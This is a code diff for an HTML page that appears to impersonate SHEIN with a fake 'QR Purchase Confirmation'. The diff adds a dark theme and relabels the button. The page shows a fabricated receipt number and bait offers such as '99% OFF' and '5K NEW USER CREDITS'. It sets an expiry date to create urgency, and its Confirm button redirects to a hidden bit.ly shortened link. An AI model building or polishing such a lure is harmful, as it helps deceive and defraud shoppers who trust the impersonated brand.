@@ -1,19 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="light">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>SHEIN QR Purchase Confirmation</title>
   <style>
+    :root {
+      --bg-color: #f5f5f5;
+      --text-color: #000;
+      --card-bg: #fff;
+      --btn-bg: #000;
+      --btn-text: #fff;
+      --nav-bg: #000;
+      --nav-item-bg: #fff;
+      --nav-item-text: #000;
+    }
+
+    [data-theme='dark'] {
+      --bg-color: #121212;
+      --text-color: #eee;
+      --card-bg: #1e1e1e;
+      --btn-bg: #fff;
+      --btn-text: #000;
+      --nav-bg: #1a1a1a;
+      --nav-item-bg: #333;
+      --nav-item-text: #fff;
+    }
+
     body {
       margin: 0;
       padding: 0;
-      background-color: #f5f5f5;
+      background-color: var(--bg-color);
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: var(--text-color);
     }
 
     .navbar {
-      background-color: #000;
+      background-color: var(--nav-bg);
       padding: 10px 15px;
       display: flex;
       justify-content: space-between;
@@ -35,11 +58,13 @@
       gap: 10px;
       flex-wrap: wrap;
       justify-content: center;
+      padding: 10px;
+      background-color: var(--nav-bg);
     }
 
     .nav-item {
-      background-color: #fff;
-      color: #000;
+      background-color: var(--nav-item-bg);
+      color: var(--nav-item-text);
       font-weight: bold;
       border: none;
       border-radius: 6px;
@@ -51,10 +76,9 @@
     }
 
     .nav-item:hover {
-      background-color: #f0f0f0;
+      background-color: #ddd;
     }
 
-    /* Mobile Nav Collapsible */
     @media (max-width: 768px) {
       .nav-toggle {
         display: block;
@@ -64,7 +88,6 @@
         display: none;
         flex-direction: column;
         width: 100%;
-        margin-top: 10px;
       }
 
       .nav-items.show {
@@ -77,21 +100,31 @@
       }
     }
 
+    .theme-toggle {
+      background: none;
+      border: none;
+      font-size: 1.5rem;
+      cursor: pointer;
+      color: #fff;
+      margin-left: auto;
+    }
+
     .container {
       display: flex;
       justify-content: center;
       align-items: center;
-      height: calc(100vh - 64px);
+      height: calc(100vh - 120px);
+      padding: 20px;
     }
 
     .card {
-      background-color: #fff;
+      background-color: var(--card-bg);
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 10px 25px rgba(0,0,0,0.1);
       text-align: left;
       max-width: 450px;
-      width: 90%;
+      width: 100%;
     }
 
     .logo {
@@ -99,37 +132,33 @@
       font-size: 1.4rem;
       text-align: center;
       margin-bottom: 20px;
-      color: #000;
     }
 
     h2 {
       font-size: 1.1rem;
       margin-bottom: 10px;
-      color: #222;
     }
 
     p {
       font-size: 0.95rem;
       margin: 6px 0;
-      color: #444;
     }
 
     .receipt {
-      background: #f0f0f0;
+      background: #eaeaea;
       padding: 10px 15px;
       border-radius: 6px;
       margin-top: 15px;
       font-size: 0.95rem;
       font-family: monospace;
-      color: #000;
     }
 
     .btn {
       margin-top: 20px;
       display: block;
       width: 100%;
-      background-color: #000;
-      color: #fff;
+      background-color: var(--btn-bg);
+      color: var(--btn-text);
       padding: 14px;
       font-weight: bold;
       border: none;
@@ -140,17 +169,13 @@
     }
 
     .btn:hover {
-      background-color: #333;
+      opacity: 0.9;
     }
 
     .btn.secondary {
       background-color: #e0e0e0;
       color: #333;
       margin-top: 10px;
-    }
-
-    .btn.secondary:hover {
-      background-color: #ccc;
     }
 
     .expired {
@@ -163,11 +188,14 @@
   </style>
 </head>
 <body>
-  <!-- Navigation Menu -->
+  <!-- Navigation -->
   <div class="navbar">
     <span style="color: #fff; font-weight: bold;">SHEIN</span>
     <button class="nav-toggle" onclick="toggleMenu()">☰</button>
+    <button id="themeToggle" class="theme-toggle" title="Toggle Theme">🌙</button>
   </div>
+
+  <!-- Collapsible Menu -->
   <div class="nav-items" id="navItems">
     <a href="nopermission.html" class="nav-item">PICK 3, 1 FREE</a>
     <a href="nopermission.html" class="nav-item">5K NEW USER CREDITS</a>
@@ -176,6 +204,7 @@
     <a href="nopermission.html" class="nav-item">DISCOUNT DASH (99% OFF)</a>
   </div>
 
+  <!-- Main Content -->
   <div class="container">
     <div class="card" id="contentCard">
       <div class="logo">SHEIN | QR Ownership</div>
@@ -189,7 +218,7 @@
         Purchase # Receipt: <strong>2ibzirc0xerysp25</strong>
       </div>
 
-      <button class="btn" onclick="confirm()">Proceed (Allowance)</button>
+      <button class="btn" onclick="confirm()">Confirm</button>
       <button class="btn secondary" onclick="checkExpiry()">Check Expiry</button>
     </div>
 
@@ -198,7 +227,14 @@
     </div>
   </div>
 
+  <!-- Scripts -->
   <script>
+    // Menu Toggle
+    function toggleMenu() {
+      document.getElementById("navItems").classList.toggle("show");
+    }
+
+    // Redirect Buttons
     function confirm() {
       window.location.href = "http://bit.ly/3IcyFtk";
     }
@@ -207,11 +243,7 @@
       window.location.href = "countdown.html";
     }
 
-    function toggleMenu() {
-      document.getElementById("navItems").classList.toggle("show");
-    }
-
-    // EXPIRY CHECK
+    // Expiry Check
     const expiryDate = new Date("2025-07-15T00:00:00");
     const now = new Date();
 
@@ -219,6 +251,24 @@
       document.getElementById('contentCard').style.display = 'none';
       document.getElementById('expiredMessage').style.display = 'block';
     }
+
+    // Theme Toggle
+    const themeBtn = document.getElementById('themeToggle');
+    const root = document.documentElement;
+    let theme = localStorage.getItem('theme') || 'light';
+
+    function setTheme(mode) {
+      root.setAttribute('data-theme', mode);
+      localStorage.setItem('theme', mode);
+      themeBtn.textContent = mode === 'dark' ? '☀️' : '🌙';
+    }
+
+    themeBtn.addEventListener('click', () => {
+      theme = theme === 'light' ? 'dark' : 'light';
+      setTheme(theme);
+    });
+
+    setTheme(theme);
   </script>
 </body>
 </html>
